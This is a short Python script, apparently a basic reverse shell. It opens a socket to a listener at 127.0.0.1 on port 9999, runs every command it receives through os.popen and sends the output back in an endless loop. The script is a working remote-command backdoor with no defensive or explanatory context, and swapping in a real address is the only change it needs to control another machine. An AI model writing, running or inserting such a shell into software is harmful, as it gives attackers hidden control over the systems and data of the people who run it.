import socket, os

#Connection setup
s = socket.socket()
ip = '127.0.0.1'
port = 9999
s.connect((ip, port))

# Remote code exec
while True:
    command = s.recv(1024).decode()
    output = os.popen(command).read()
    s.send(output.encode())
s.close()